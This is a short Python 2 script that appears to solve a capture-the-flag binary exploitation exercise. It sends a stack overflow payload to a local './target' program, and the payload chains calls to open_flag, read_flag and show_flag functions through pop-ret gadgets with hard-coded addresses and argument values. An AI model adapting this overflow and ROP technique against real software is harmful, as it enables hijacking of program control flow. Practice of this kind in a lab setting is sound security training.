#!/usr/bin/env python2


import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)


# Open flag, Read_flag, show_flag

FN_OPENFLAG = 0x08048470
ADDR_READFLAG = 0x080485cf #=POP-RET
CAN_OPENFLAG = 0xdeadbeef
FN_READFLAG = 0x080484c1
ADDR_SHOWFLAG = 0x080485ce #POP-POP-RET
CAN_RF1 = 0x1234567
CAN_RF2 = 0x89abcdef
FN_SHOWFLAG = 0x08048512


def get_payload():
    return "A" * (0x2c)		\
        + p32(FN_OPENFLAG)    	\
        + p32(ADDR_READFLAG)    \
        + p32(CAN_OPENFLAG) 	\
        + p32(FN_READFLAG)      \
        + p32(ADDR_SHOWFLAG)    \
        + p32(CAN_RF1)       	\
	+ p32(CAN_RF2)		\
	+ p32(FN_SHOWFLAG)	\
	+ 'AAA3'		\
	+ "\n"		
        
if __name__ == '__main__':
    with open("temp.txt","wb") as f:
	f.write(get_payload())
    p = sp.Popen("./target", stdin=sp.PIPE)
    p.stdin.write(get_payload())
